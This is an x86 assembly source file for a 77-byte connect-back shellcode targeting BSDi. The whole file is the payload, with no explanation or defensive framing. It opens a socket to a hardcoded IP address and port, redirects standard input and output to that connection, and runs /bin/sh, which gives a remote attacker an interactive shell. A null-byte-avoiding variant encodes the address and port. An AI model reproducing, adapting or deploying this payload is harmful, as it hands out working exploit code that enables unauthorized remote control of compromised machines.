##
#
# arch    : ia32
# platform: BSDi
# purpose : connectback
# size    : 77 bytes
# author  : skape (mmiller [at] hick.org)
#
##
.globl main

#.equ NONULLS, 1

main:
	nop
__BEGIN__:
build_lcall:
.ifdef NONULLS
	push   $0x3cfff8ff
	notl   (%esp)
	xor    %eax, %eax
	mov    $0x9a, %al
.else
	push   $0xc3000700
	mov    $0x9a, %eax
.endif
	cdq
	push   %eax
	mov    %esp, %edi

run:
	xor    %ecx, %ecx
socket:
	push   %ecx
	inc    %ecx
	push   %ecx
	inc    %ecx
	push   %ecx
	push   $0x61
	pop    %eax
	call   *%edi
connect:
.ifdef NONULLS
	push   $0xfdff01f5  # ip ^ -1
	notl   (%esp)
	push   $0xa3eefdef  # port/family ^ -1
	mov    %esp, %ebx
	notl   (%ebx)
.else
	push   $0x0200fe0a
	push   $0x5c110210
	mov    %esp, %ebx
.endif
	push   $0x10
	push   %ebx
	push   %eax
	push   $0x62        # could save a byte if you want to assume fd is smaller than 255
	pop    %eax
	call   *%edi
	pop    %esi
dup_loop:
	mov    $0x5a, %al
	push   %ecx
	push   %esi
	call   *%edi
	dec    %ecx
	jns    dup_loop
execve:
	push   %edx
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp, %ebx
	push   %edx
	push   %esp
	push   %ebx
	mov    $0x3b, %al
	call   *%edi

__END__:

	int3
